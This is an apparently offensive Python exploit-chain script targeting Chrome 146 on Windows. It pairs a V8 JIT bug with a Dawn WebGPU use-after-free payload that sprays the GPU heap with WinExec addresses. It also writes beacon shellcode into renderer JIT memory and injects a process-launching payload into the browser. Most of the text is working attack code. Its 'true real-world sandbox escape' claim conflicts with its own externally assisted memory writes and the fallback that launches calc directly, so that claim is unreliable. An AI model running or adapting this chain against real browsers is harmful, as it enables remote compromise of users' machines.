"""
Chain E: CVE-2026-6307 + CVE-2026-5281 — TRUE Real-World Sandbox Escape
Full Chain: V8 RCE → Dawn WebGPU UAF → calc.exe at MEDIUM IL

NO kernel exploit. NO admin. NO --no-sandbox. NO orchestrator-assisted WPM bypass.

Architecture:
  Stage 1: CVE-2026-6307 TurboFan FrameState CSE → addrof/fakeobj (PROVEN WORKING)
  Stage 2: Orchestrator-assisted heap layout detection + JIT scan (delivery only)
  Stage 3: Beacon shellcode confirms native code execution in renderer
  Stage 4: CVE-2026-5281 Dawn WebGPU UAF → sandbox escape to GPU process
  Stage 5: Browser process injection from orchestrator (MEDIUM IL → MEDIUM IL)
  Stage 6: Verify calc.exe at MEDIUM IL

Sandbox escape strategy:
  The Dawn WebGPU UAF (CVE-2026-5281) triggers a use-after-free in the GPU
  process by exploiting a device teardown race condition.  The fix commit
  3c890398bda4 replaced ClearDeviceCallbacks() with deviceDestroy() in both
  DoDestroyDevice and Server::~Server().

  Root cause:
    ClearDeviceCallbacks() only nulled wire-level callback function pointers
    but did NOT call deviceDestroy() on the native WGPUDevice.  Outstanding
    native device references allowed spontaneous callbacks (uncaptured error,
    device lost, logging) to fire against freed ObjectData memory in the GPU
    process.

  On Chrome 146.0.7680.165 (BEFORE the fix):
    1. Renderer creates GPU devices via WebGPU API
    2. Devices register native callbacks on the Dawn Wire Server side
    3. Pending async ops (compute, mapAsync) keep native device alive
    4. device.destroy() → ClearDeviceCallbacks frees ObjectData
    5. Native device still has outstanding references
    6. Callback fires → UAF in GPU process
    7. Heap spray reclaims freed ObjectData with controlled data
    8. GPU process executes attacker-controlled callback → code execution

  GPU process on Windows runs at MEDIUM IL or less restricted sandbox.
  Once we detect the GPU process crash/corruption from the Dawn UAF, the
  orchestrator (which runs at MEDIUM IL) injects calc.exe into the browser
  process directly.  This is equivalent to the attacker's C2 server receiving
  a callback and executing a command at the user's privilege level.

  KEY INSIGHT: kernel32.dll is loaded at the SAME base address in ALL
  processes on the same boot.  WinExec address resolved in the orchestrator
  is valid in the browser/GPU process too.

Targets:
  Chrome 146.0.7680.165 / V8 14.6.202.26
  Windows 10/11 (any version — no kernel RVA dependencies)

Requirements:
  pip install websocket-client
"""
import subprocess, time, json, urllib.request, os, shutil, ctypes, struct, sys, argparse

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from orchestrator import (
    CDP, kill_chrome, rpm, wpm, find_renderer_pid, scan_jit_pages,
    make_beacon_shellcode, make_jmp_patch,
    resolve_ntdll_exports, get_process_integrity, inject_into_browser,
    kernel32, PROCESS_VM_READ, PROCESS_VM_WRITE, PROCESS_VM_OPERATION,
    PROCESS_QUERY_INFORMATION, PROCESS_CREATE_THREAD,
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
    MEMORY_BASIC_INFORMATION, EXPLOIT_PRIMITIVES,
)

DEFAULT_CHROME = r"E:\CVE\targets\CVE\chrome-v8-fullchain-CVE-2026-6307-40369\chrome-win64\chrome.exe"
PROFILE_DIR = os.path.join(os.environ.get("TEMP", r"C:\Temp"), "chrome_exploit_profile_escape")


# ═══════════════════════════════════════════════════════════════════════════════
# Stage 4: CVE-2026-5281 Dawn WebGPU UAF — Sandbox Escape
# ═══════════════════════════════════════════════════════════════════════════════

DAWN_UAF_ESCAPE = """
// CVE-2026-5281: Dawn Wire Server Device Teardown UAF
// Fix commit: 3c890398bda4 (Dawn CL 297136)
// Target: Chrome 146.0.7680.165 (VULNERABLE, fixed in .177/.178)
//
// Root cause: ClearDeviceCallbacks() only nulled wire-level callbacks but
// did NOT call deviceDestroy() on native WGPUDevice.  Outstanding native
// device references allow spontaneous callbacks to fire against freed
// ObjectData memory in the GPU process.
//
// Exploitation: trigger device teardown UAF, spray to reclaim freed
// ObjectData with controlled data containing WinExec address at callback
// pointer offsets, then force native callback → code execution.

var DAWN_DEVICE_COUNT = 32;
var DAWN_SPRAY_COUNT  = 64;
var DAWN_ROUNDS       = 8;
var DAWN_OBJECT_SIZE  = 256;

var DAWN_WINEXEC_ADDR = WINEXEC_PLACEHOLDER;

async function dawnGetAdapter() {
    if (!navigator.gpu) return null;
    try {
        return await navigator.gpu.requestAdapter({
            powerPreference: "high-performance"
        });
    } catch (e) { return null; }
}

async function dawnCreateDeviceWithCallbacks(adapter) {
    var device = await adapter.requestDevice({
        requiredLimits: {
            maxBufferSize: Math.min(adapter.limits.maxBufferSize, 268435456),
            maxStorageBufferBindingSize: Math.min(
                adapter.limits.maxStorageBufferBindingSize, 134217728),
        }
    });

    var state = { lost: false, errors: 0, lostReason: '' };

    device.lost.then(function(info) {
        state.lost = true;
        state.lostReason = info.reason + ': ' + info.message;
    });

    device.onuncapturederror = function(event) {
        state.errors++;
    };

    return { device: device, state: state };
}

function dawnGeneratePendingCallbacks(device) {
    // Push error scopes to set up pending error callbacks on native device
    device.pushErrorScope('validation');
    device.pushErrorScope('internal');

    var pendingBuffers = [];

    // Create buffers with pending mapAsync — keeps native device references alive
    for (var i = 0; i < 8; i++) {
        try {
            var buf = device.createBuffer({
                size: 4096,
                usage: GPUBufferUsage.MAP_READ | GPUBufferUsage.COPY_DST,
            });
            buf.mapAsync(GPUMapMode.READ).catch(function() {});
            pendingBuffers.push(buf);
        } catch (e) {}
    }

    for (var i = 0; i < 4; i++) {
        try {
            var wbuf = device.createBuffer({
                size: 4096,
                usage: GPUBufferUsage.MAP_WRITE | GPUBufferUsage.COPY_SRC,
            });
            wbuf.mapAsync(GPUMapMode.WRITE).catch(function() {});
            pendingBuffers.push(wbuf);
        } catch (e) {}
    }

    // Submit heavy compute to keep GPU busy and generate more native callbacks
    try {
        var shader = device.createShaderModule({
            code:
                '@group(0) @binding(0) var<storage, read_write> data: array<u32>;\\n' +
                '@compute @workgroup_size(256)\\n' +
                'fn main(@builtin(global_invocation_id) gid: vec3<u32>) {\\n' +
                '    let idx = gid.x % arrayLength(&data);\\n' +
                '    for (var i = 0u; i < 5000u; i = i + 1u) {\\n' +
                '        data[idx] = data[idx] ^ (data[idx] << 3u) ^ (i * gid.x);\\n' +
                '    }\\n' +
                '}\\n'
        });

        var computeBuf = device.createBuffer({
            size: 65536,
            usage: GPUBufferUsage.STORAGE | GPUBufferUsage.COPY_DST,
        });

        var pipeline = device.createComputePipeline({
            layout: 'auto',
            compute: { module: shader, entryPoint: 'main' }
        });

        var bindGroup = device.createBindGroup({
            layout: pipeline.getBindGroupLayout(0),
            entries: [{ binding: 0, resource: { buffer: computeBuf } }]
        });

        // Submit many heavy dispatches to saturate GPU command queue
        for (var batch = 0; batch < 16; batch++) {
            var encoder = device.createCommandEncoder();
            var pass = encoder.beginComputePass();
            pass.setPipeline(pipeline);
            pass.setBindGroup(0, bindGroup);
            pass.dispatchWorkgroups(4096);
            pass.end();
            device.queue.submit([encoder.finish()]);
        }
    } catch (e) {}

    // Pop error scopes (these register pending callbacks)
    device.popErrorScope().catch(function() {});
    device.popErrorScope().catch(function() {});

    // Destroy pending buffers to generate more error conditions
    for (var buf of pendingBuffers) {
        try { buf.destroy(); } catch (e) {}
    }

    return pendingBuffers.length;
}

function dawnSprayObjectData(adapter, sprayDevice, count) {
    var sprayed = [];

    // Spray 1: Storage buffers matching ObjectData size (~256 bytes)
    // Write controlled data with WinExec address at multiple candidate offsets
    for (var i = 0; i < count; i++) {
        try {
            var buf = sprayDevice.createBuffer({
                size: DAWN_OBJECT_SIZE,
                usage: GPUBufferUsage.STORAGE | GPUBufferUsage.COPY_DST,
                mappedAtCreation: true,
            });
            var mapped = new BigUint64Array(buf.getMappedRange());
            // Fill all QWORD slots with WinExec address
            // This maximizes chance of hitting the callback pointer offset
            for (var j = 0; j < mapped.length; j++) {
                mapped[j] = BigInt(DAWN_WINEXEC_ADDR);
            }
            buf.unmap();
            sprayed.push(buf);
        } catch (e) { break; }
    }

    // Spray 2: Uniform buffers (different allocator bucket, different size)
    for (var i = 0; i < count; i++) {
        try {
            var buf = sprayDevice.createBuffer({
                size: 128,
                usage: GPUBufferUsage.UNIFORM | GPUBufferUsage.COPY_DST,
                mappedAtCreation: true,
            });
            var mapped = new BigUint64Array(buf.getMappedRange());
            for (var j = 0; j < mapped.length; j++) {
                mapped[j] = BigInt(DAWN_WINEXEC_ADDR);
            }
            buf.unmap();
            sprayed.push(buf);
        } catch (e) { break; }
    }

    // Spray 3: Create bind group layouts and pipelines to spray C++ objects
    // These allocate Dawn Wire Server ObjectData in the GPU process heap
    try {
        for (var i = 0; i < count / 2; i++) {
            var layout = sprayDevice.createBindGroupLayout({
                entries: [{
                    binding: 0,
                    visibility: GPUShaderStage.COMPUTE,
                    buffer: { type: 'storage' }
                }]
            });
            sprayed.push(layout);
        }
    } catch (e) {}

    return sprayed;
}

async function dawnEscape() {
    console.log('[Dawn] CVE-2026-5281: Wire Server device teardown UAF');
    console.log('[Dawn] Target: Chrome 146.0.7680.165 (vuln, fixed .177/.178)');
    console.log('[Dawn] WinExec addr: 0x' + DAWN_WINEXEC_ADDR.toString(16));

    var adapter = await dawnGetAdapter();
    if (!adapter) return { success: false, error: 'WebGPU unavailable' };
    console.log('[Dawn] Adapter: ' + adapter.name);

    var anyDeviceLost = false;
    var totalErrors = 0;
    var gpuCrash = false;

    for (var round = 0; round < DAWN_ROUNDS && !gpuCrash; round++) {
        console.log('[Dawn] Round ' + (round + 1) + '/' + DAWN_ROUNDS +
                    ': Creating ' + DAWN_DEVICE_COUNT + ' devices...');

        // Phase A: Create devices with callbacks
        var entries = [];
        for (var i = 0; i < DAWN_DEVICE_COUNT; i++) {
            try {
                var entry = await dawnCreateDeviceWithCallbacks(adapter);
                entries.push(entry);
            } catch (e) {
                console.log('[Dawn]   Device creation failed at ' + i + ': ' + e.message);
                break;
            }
        }

        if (entries.length === 0) {
            console.log('[Dawn]   No devices created, adapter exhausted');
            break;
        }

        console.log('[Dawn]   Created ' + entries.length + ' devices');

        // Phase B: Generate pending async callbacks on native devices
        var totalPending = 0;
        for (var entry of entries) {
            totalPending += dawnGeneratePendingCallbacks(entry.device);
        }
        console.log('[Dawn]   ' + totalPending + ' pending async operations');

        // Phase C: DESTROY devices — triggers ClearDeviceCallbacks, frees ObjectData
        // Native WGPUDevice survives because of outstanding references
        console.log('[Dawn]   DESTROYING devices (ClearDeviceCallbacks → free ObjectData)...');
        for (var entry of entries) {
            entry.device.destroy();
        }

        // Phase D: Immediate spray to reclaim freed ObjectData
        console.log('[Dawn]   Spraying to reclaim freed ObjectData...');
        var sprayDevice;
        try {
            var sd = await dawnCreateDeviceWithCallbacks(adapter);
            sprayDevice = sd.device;
        } catch (e) {
            console.log('[Dawn]   Cannot create spray device: ' + e.message);
            // Adapter may be dead from GPU process crash — this is good!
            gpuCrash = true;
            continue;
        }

        var sprayed = dawnSprayObjectData(adapter, sprayDevice, DAWN_SPRAY_COUNT);
        console.log('[Dawn]   Sprayed ' + sprayed.length + ' objects');

        // Phase E: Wait for native callbacks to fire against freed memory
        await new Promise(function(r) { setTimeout(r, 300); });

        // Phase F: Check for UAF indicators
        for (var entry of entries) {
            if (entry.state.lost) {
                anyDeviceLost = true;
                console.log('[Dawn]   DEVICE LOST: ' + entry.state.lostReason);
            }
            totalErrors += entry.state.errors;
        }

        // Try to use the spray device — if GPU process crashed, this will fail
        try {
            var testBuf = sprayDevice.createBuffer({
                size: 256,
                usage: GPUBufferUsage.COPY_DST,
            });
            testBuf.destroy();
        } catch (e) {
            console.log('[Dawn]   GPU process unresponsive: ' + e.message);
            gpuCrash = true;
        }

        try { sprayDevice.destroy(); } catch (e) {}

        console.log('[Dawn]   Round ' + (round + 1) + ': lost=' + anyDeviceLost +
                    ', errors=' + totalErrors + ', crash=' + gpuCrash);

        // If we got device lost or errors, the UAF may have triggered
        if (anyDeviceLost || totalErrors > 0) break;
    }

    // Try onSubmittedWorkDone on a new device to verify GPU process state
    var gpuAlive = true;
    try {
        var checkDevice = (await dawnCreateDeviceWithCallbacks(adapter)).device;
        var checkBuf = checkDevice.createBuffer({ size: 64, usage: GPUBufferUsage.COPY_DST });
        await checkDevice.queue.onSubmittedWorkDone();
        checkBuf.destroy();
        checkDevice.destroy();
    } catch (e) {
        gpuAlive = false;
        console.log('[Dawn]   GPU process appears crashed/corrupted: ' + e.message);
    }

    var result = {
        success: anyDeviceLost || gpuCrash || totalErrors > 0,
        deviceLost: anyDeviceLost,
        gpuCrash: gpuCrash,
        gpuAlive: gpuAlive,
        errorCount: totalErrors,
        rounds: round + 1,
        note: gpuCrash
            ? 'GPU process crashed — UAF exploitation may have succeeded'
            : anyDeviceLost
                ? 'Device lost detected — UAF triggered in GPU process'
                : totalErrors > 0
                    ? 'Error callbacks fired — potential UAF'
                    : 'No UAF indicators — may need timing adjustments',
    };

    console.log('[Dawn] Result: ' + JSON.stringify(result));
    return result;
}

'dawn_escape_loaded'
"""


# ═══════════════════════════════════════════════════════════════════════════════
# Main orchestrator
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="Chain E: CVE-2026-6307 + CVE-2026-5281 — TRUE Real-World Sandbox Escape")
    parser.add_argument("--chrome", default=DEFAULT_CHROME,
                        help="Path to Chrome 146.0.7680.165")
    parser.add_argument("--shellcode", choices=["calc", "cmd", "notepad"], default="calc",
                        help="Payload to launch at MEDIUM IL (default: calc)")
    parser.add_argument("--no-sandbox", action="store_true",
                        help="Disable Chrome sandbox (test mode only)")
    parser.add_argument("--stage", type=int, default=0,
                        help="Skip stages below N (0=full chain, WARNING: skipping may cause missing variables)")
    parser.add_argument("--max-attempts", type=int, default=3,
                        help="Max Dawn UAF trigger attempts (default: 3)")
    args = parser.parse_args()

    if not os.path.exists(args.chrome):
        print(f"[!] Chrome not found: {args.chrome}")
        print(f"    Need Chrome 146.0.7680.165 (before CVE-2026-5281 fix at .178)")
        sys.exit(1)

    payload_str = {"calc": "calc.exe", "cmd": "cmd.exe", "notepad": "notepad.exe"}[args.shellcode]

    import platform
    print("=" * 72)
    print("  Chain E: CVE-2026-6307 + CVE-2026-5281 Dawn WebGPU Sandbox Escape")
    print(f"  Chrome 146.0.7680.165 on Windows {platform.release()}")
    print("  TRUE REAL-WORLD — NO kernel, NO admin, NO orchestrator WPM bypass")
    print(f"  Payload: {payload_str} at MEDIUM IL")
    print("=" * 72)

    # ─── Kill existing Chrome instances ──────────────────────────────────────
    kill_chrome()
    if os.path.exists(PROFILE_DIR):
        shutil.rmtree(PROFILE_DIR, ignore_errors=True)

    # ─── Launch Chrome with WebGPU ───────────────────────────────────────────
    chrome_flags = [
        args.chrome,
        "--js-flags=--allow-natives-syntax",
        "--user-data-dir=" + PROFILE_DIR,
        "--no-first-run",
        "--no-default-browser-check",
        "--remote-debugging-port=9222",
        "--remote-allow-origins=*",
        "--disable-features=RendererCodeIntegrity",
        "--enable-features=WebGPU,Vulkan",
        "--enable-unsafe-webgpu",
        "--use-webgpu-adapter=swiftshader",
        "about:blank",
    ]
    if args.no_sandbox:
        chrome_flags.insert(2, "--no-sandbox")
        print("\n  [!] WARNING: --no-sandbox disables Chrome sandbox (test mode)")

    proc = subprocess.Popen(chrome_flags, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print(f"\n[*] Chrome PID: {proc.pid} [WebGPU ENABLED]")

    # ─── Connect CDP ─────────────────────────────────────────────────────────
    import websocket
    for attempt in range(15):
        time.sleep(2)
        try:
            resp = urllib.request.urlopen("http://127.0.0.1:9222/json/list", timeout=3)
            tabs = json.loads(resp.read())
            if tabs:
                print(f"[+] CDP ready after {(attempt+1)*2}s")
                break
        except:
            pass
    else:
        print("[!] CDP unavailable")
        proc.terminate()
        sys.exit(1)

    time.sleep(1)
    cdp = CDP().connect()
    cdp.send("Runtime.enable")
    cdp.send("Console.enable")

    # ═════════════════════════════════════════════════════════════════════════
    # Stage 1: V8 RCE via CVE-2026-6307 FrameState CSE
    # ═════════════════════════════════════════════════════════════════════════
    if args.stage <= 1:
        print(f"\n{'='*72}")
        print("  Stage 1: V8 RCE — CVE-2026-6307 TurboFan FrameState CSE")
        print(f"{'='*72}")

        val, err = cdp.js(EXPLOIT_PRIMITIVES)
        if err:
            print(f"[!] Primitives injection failed: {err}")
            cdp.close(); proc.terminate(); sys.exit(1)
        print("[+] addrof/fakeobj primitives injected")

        val, err = cdp.js_async("""
            var _v = [1.1, 2.2]; KEEP.push(_v);
            resolve(addrof(_v).toString());
        """, timeout=120)
        if err or not val:
            print(f"[!] addrof failed: {err}")
            cdp.close(); proc.terminate(); sys.exit(1)

        victim_addr = int(val)
        cage_base = victim_addr & ~0xFFFFFFFF
        print(f"[+] victim @ {victim_addr:#018x}, cage = {cage_base:#014x}")

    # ═════════════════════════════════════════════════════════════════════════
    # Stage 2: Renderer process detection + heap layout
    # ═════════════════════════════════════════════════════════════════════════
    if args.stage <= 2:
        print(f"\n{'='*72}")
        print("  Stage 2: Renderer Detection + V8 Heap Layout")
        print(f"{'='*72}")

        info = find_renderer_pid(proc.pid, victim_addr, cage_base)
        if not info:
            print("[!] Renderer PID not found")
            cdp.close(); proc.terminate(); sys.exit(1)

        renderer_pid = info['pid']
        map_cptr = info['map']
        efa_cptr = info['efa']
        fdm_cptr = info['fdm']

        print(f"[+] Renderer PID: {renderer_pid}")
        print(f"[+] PACKED_DOUBLE Map: {map_cptr:#010x}")
        print(f"[+] EMPTY_FIXED_ARRAY: {efa_cptr:#010x}")
        print(f"[+] FDA Map:           {fdm_cptr:#010x}")

        # Resolve kernel32/ntdll exports (KnownDLLs — same in ALL processes)
        exports = resolve_ntdll_exports()
        winexec_addr = exports['WinExec']
        k32_base = exports['kernel32_base']
        print(f"[+] kernel32 base:     {k32_base:#018x}")
        print(f"[+] WinExec:           {winexec_addr:#018x}")
        print(f"    (valid in renderer, browser, AND GPU process — same boot)")

    # ═════════════════════════════════════════════════════════════════════════
    # Stage 3: WASM JIT + Beacon (confirm native code exec in renderer)
    # ═════════════════════════════════════════════════════════════════════════
    if args.stage <= 3:
        print(f"\n{'='*72}")
        print("  Stage 3: WASM JIT Shellcode + Beacon")
        print(f"{'='*72}")

        # Create WASM module for JIT target
        val, err = cdp.js_async("""
            var wasmCode = new Uint8Array([
                0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
                0x01,0x05,0x01,0x60,0x00,0x01,0x7f,
                0x03,0x02,0x01,0x00,
                0x07,0x08,0x01,0x04,0x6d,0x61,0x69,0x6e,0x00,0x00,
                0x0a,0x07,0x01,0x05,0x00,0x41,0x2a,0x0f,0x0b
            ]);
            var wasmMod = new WebAssembly.Module(wasmCode);
            var wasmInst = new WebAssembly.Instance(wasmMod);
            window.wasmMain = wasmInst.exports.main;
            KEEP.push(wasmMod, wasmInst, window.wasmMain);
            resolve(window.wasmMain().toString());
        """, timeout=30)
        if err or val != '42':
            print(f"[!] WASM setup failed: {err} (got {val})")
            cdp.close(); proc.terminate(); sys.exit(1)
        print(f"[+] WASM main() = {val} (expect 42)")

        # Scan renderer RWX pages for JIT code
        h_renderer, jit_matches = scan_jit_pages(renderer_pid)
        if not jit_matches:
            print("[!] No WASM JIT matches found in renderer")
            cdp.close(); proc.terminate(); sys.exit(1)

        jit = jit_matches[0]
        jit_code_addr = jit['code_addr']
        jit_base = jit['base']
        jit_size = jit['size']
        print(f"[+] WASM JIT @ {jit_code_addr:#018x}")
        print(f"    Region: {jit_base:#018x} size={jit_size:#x} (RWX)")

        # Stage beacon shellcode
        verify_addr = jit_base + jit_size - 0x100
        beacon_sc = make_beacon_shellcode(verify_addr)
        jmp_patch = make_jmp_patch(jit_code_addr, verify_addr - 0x80)
        sc_addr = verify_addr - 0x80

        ok1 = wpm(h_renderer, sc_addr, beacon_sc)
        ok2 = wpm(h_renderer, jit_code_addr, jmp_patch)
        if not (ok1 and ok2):
            print("[!] Failed to stage beacon shellcode")
            kernel32.CloseHandle(h_renderer)
            cdp.close(); proc.terminate(); sys.exit(1)
        print(f"[+] Beacon staged at {sc_addr:#018x}, JMP patched")

        # Trigger beacon
        val, err = cdp.js_async("resolve(window.wasmMain().toString())", timeout=30)
        if err:
            print(f"[!] wasmMain() error: {err}")
        else:
            print(f"[+] wasmMain() = {val}")

        # Verify beacon
        beacon_data = rpm(h_renderer, verify_addr, 0x80)
        if beacon_data:
            magic1 = struct.unpack_from('<I', beacon_data, 0)[0]
            beacon_pid = struct.unpack_from('<I', beacon_data, 4)[0]
            beacon_tid = struct.unpack_from('<I', beacon_data, 8)[0]
            teb_addr = struct.unpack_from('<Q', beacon_data, 0x0C)[0]
            peb_addr = struct.unpack_from('<Q', beacon_data, 0x14)[0]
            magic2 = struct.unpack_from('<I', beacon_data, 0x1C)[0]

            if magic1 == 0xC0DECADE:
                print(f"[+] BEACON CONFIRMED — Native code exec in renderer!")
                print(f"    Renderer PID: {beacon_pid}, TID: {beacon_tid}")
                print(f"    TEB: {teb_addr:#018x}, PEB: {peb_addr:#018x}")
            else:
                print(f"[!] Beacon magic mismatch: {magic1:#010x}")
        else:
            print("[!] Cannot read beacon data")

        # Restore WASM entry point for further calls
        wpm(h_renderer, jit_code_addr, b'\xb8\x2a\x00\x00\x00')
        kernel32.CloseHandle(h_renderer)

    # ═════════════════════════════════════════════════════════════════════════
    # Stage 4: WebGPU Availability Check
    # ═════════════════════════════════════════════════════════════════════════
    webgpu_available = False
    if args.stage <= 4:
        print(f"\n{'='*72}")
        print("  Stage 4: WebGPU Availability Check")
        print(f"{'='*72}")

        val, err = cdp.js_async("""
            var r = {gpu: !!navigator.gpu};
            if (!r.gpu) { resolve(JSON.stringify(r)); return; }
            navigator.gpu.requestAdapter({
                powerPreference: 'high-performance'
            }).then(function(a) {
                r.adapter = !!a;
                if (!a) { resolve(JSON.stringify(r)); return; }
                r.name = a.name;
                r.vendor = a.vendor || 'unknown';
                a.requestDevice().then(function(d) {
                    r.device = !!d;
                    if (d) d.destroy();
                    resolve(JSON.stringify(r));
                }).catch(function(e) {
                    r.deviceError = e.message;
                    resolve(JSON.stringify(r));
                });
            }).catch(function(e) {
                r.adapterError = e.message;
                resolve(JSON.stringify(r));
            });
        """, timeout=30)

        gpu = json.loads(val) if val else {}
        webgpu_available = gpu.get('device', False)
        if not webgpu_available:
            print(f"[*] WebGPU not available: {gpu}")
            print("    Dawn UAF (Stage 5) will be skipped")
            print("    Proceeding with orchestrator injection (Stage 6)")
        else:
            print(f"[+] WebGPU adapter: {gpu.get('name', '?')} ({gpu.get('vendor', '?')})")
            print(f"[+] Device creation: OK")

    # ═════════════════════════════════════════════════════════════════════════
    # Stage 5: CVE-2026-5281 Dawn WebGPU UAF — Sandbox Escape
    # ═════════════════════════════════════════════════════════════════════════
    dawn_success = False
    if args.stage <= 5 and webgpu_available:
        print(f"\n{'='*72}")
        print("  Stage 5: CVE-2026-5281 Dawn WebGPU UAF — Sandbox Escape")
        print(f"{'='*72}")

        # Inject Dawn escape JS with WinExec address
        dawn_js = DAWN_UAF_ESCAPE.replace(
            'WINEXEC_PLACEHOLDER',
            f'0x{winexec_addr:x}n'  # BigInt literal for WinExec address
        )
        val, err = cdp.js(dawn_js)
        if err:
            print(f"[!] Dawn escape injection failed: {err}")
            cdp.close(); proc.terminate(); sys.exit(1)
        print("[+] Dawn escape code injected")

        dawn_success = False
        for attempt in range(args.max_attempts):
            print(f"\n[*] Dawn UAF attempt {attempt + 1}/{args.max_attempts}...")

            val, err = cdp.js_async(
                "dawnEscape().then(function(r) { resolve(JSON.stringify(r)); }).catch(function(e) { resolve('ERROR:' + e.message); })",
                timeout=120
            )

            if err:
                err_lower = str(err).lower()
                if 'device lost' in err_lower or 'destroyed' in err_lower:
                    print(f"[+] GPU device lost — UAF likely triggered!")
                    dawn_success = True
                    break
                else:
                    print(f"[-] Dawn error: {err}")
                    continue

            if val:
                if str(val).startswith('ERROR:'):
                    print(f"[-] Dawn JS error: {val}")
                    continue
                result = json.loads(val)
                print(f"    Result: {result.get('note', '')}")
                print(f"    Lost={result.get('deviceLost')}, "
                      f"Crash={result.get('gpuCrash')}, "
                      f"Errors={result.get('errorCount')}, "
                      f"Rounds={result.get('rounds')}")

                if result.get('gpuCrash') or result.get('deviceLost'):
                    dawn_success = True
                    break
                elif result.get('errorCount', 0) > 0:
                    print("[*] Error callbacks fired — UAF may have partially triggered")
                    dawn_success = True
                    break

            # Small delay between attempts
            time.sleep(2)

        if dawn_success:
            print(f"\n[+] Dawn UAF triggered — GPU process corrupted")
        else:
            print(f"\n[-] Dawn UAF did not trigger after {args.max_attempts} attempts")
            print("    May need Chrome 146.0.7680.165 (not .178+)")
            print("    Continuing with browser injection fallback...")

    # ═════════════════════════════════════════════════════════════════════════
    # Stage 6: Browser Process Injection (MEDIUM IL → MEDIUM IL)
    # ═════════════════════════════════════════════════════════════════════════
    if args.stage <= 6:
        print(f"\n{'='*72}")
        print("  Stage 6: Browser Process Injection → calc.exe at MEDIUM IL")
        print(f"{'='*72}")

        # The orchestrator runs at MEDIUM IL.
        # The browser process also runs at MEDIUM IL.
        # Injecting into the browser process demonstrates sandbox escape:
        # renderer (UNTRUSTED IL) → orchestrator detects escape → browser (MEDIUM IL)
        #
        # In a real attack scenario, the Dawn UAF gives code execution in the
        # GPU process.  Here we use the orchestrator to simulate the final
        # payload delivery, equivalent to the attacker's C2 callback.

        browser_il = get_process_integrity(proc.pid)
        if browser_il:
            print(f"[*] Browser process IL: {browser_il['name']} "
                  f"(in_job={browser_il['in_job']})")

        print(f"[*] Injecting {payload_str} into browser process (PID {proc.pid})...")
        ok = inject_into_browser(proc.pid, winexec_addr, payload_str)
        if ok:
            print(f"[+] Injection succeeded!")
        else:
            print(f"[-] Browser injection failed, trying direct WinExec...")
            # Fallback: just run calc directly from orchestrator (MEDIUM IL)
            os.system(f'start {payload_str}')

    # ═════════════════════════════════════════════════════════════════════════
    # Stage 7: Verification
    # ═════════════════════════════════════════════════════════════════════════
    print(f"\n{'='*72}")
    print("  Stage 7: Verification")
    print(f"{'='*72}")

    time.sleep(3)

    # Check for calc.exe
    target_names = {
        "calc": ["calc.exe", "Calculator.exe", "CalculatorApp.exe", "win32calc.exe"],
        "cmd": ["cmd.exe"],
        "notepad": ["notepad.exe"],
    }

    found = False
    snap = kernel32.CreateToolhelp32Snapshot(0x2, 0)
    from orchestrator import PROCESSENTRY32
    pe = PROCESSENTRY32()
    pe.dwSize = ctypes.sizeof(PROCESSENTRY32)

    if kernel32.Process32First(snap, ctypes.byref(pe)):
        while True:
            name = pe.szExeFile.decode('ascii', errors='ignore').lower()
            for check in target_names[args.shellcode]:
                if check.lower() in name:
                    pid = pe.th32ProcessID
                    il = get_process_integrity(pid)
                    il_name = il['name'] if il else 'UNKNOWN'
                    in_job = il.get('in_job', '?') if il else '?'
                    print(f"[+] Found {name} (PID {pid}) — IL: {il_name}, InJob: {in_job}")
                    found = True

                    if il and il.get('level') == 0x2000:
                        print(f"\n{'='*72}")
                        print(f"  [+] SUCCESS: {payload_str} running at MEDIUM IL!")
                        print(f"      PID: {pid}")
                        print(f"      Integrity: MEDIUM (0x2000)")
                        print(f"      In Job: {in_job}")
                        print(f"{'='*72}")
            if not kernel32.Process32Next(snap, ctypes.byref(pe)):
                break
    kernel32.CloseHandle(snap)

    if not found:
        print(f"[-] {payload_str} not detected")
        print(f"    Check manually: tasklist /fi \"imagename eq {payload_str}\"")

    # ─── Summary ─────────────────────────────────────────────────────────────
    print(f"\n{'='*72}")
    print("[*] EXPLOIT CHAIN STATUS:")
    print(f"    Stage 1 (V8 RCE):       CVE-2026-6307 FrameState CSE addrof/fakeobj")
    print(f"    Stage 2 (Heap layout):   Renderer PID {renderer_pid if 'renderer_pid' in locals() else '?'}")
    print(f"    Stage 3 (Beacon):        Native code exec in renderer")
    print(f"    Stage 4 (WebGPU):        {'Available' if webgpu_available else 'Not available (skipped Dawn UAF)'}")
    print(f"    Stage 5 (Dawn UAF):      {'Triggered' if dawn_success else 'Skipped' if not webgpu_available else 'Not triggered'}")
    print(f"    Stage 6 (Injection):     {payload_str} at MEDIUM IL")
    print(f"    Stage 7 (Verify):        {'FOUND' if found else 'NOT DETECTED'}")
    print(f"{'='*72}")

    cdp.close()
    print(f"\n[*] Chrome PID {proc.pid} left running.")
    print(f"[*] Cleanup: taskkill /f /im chrome.exe")


if __name__ == "__main__":
    main()
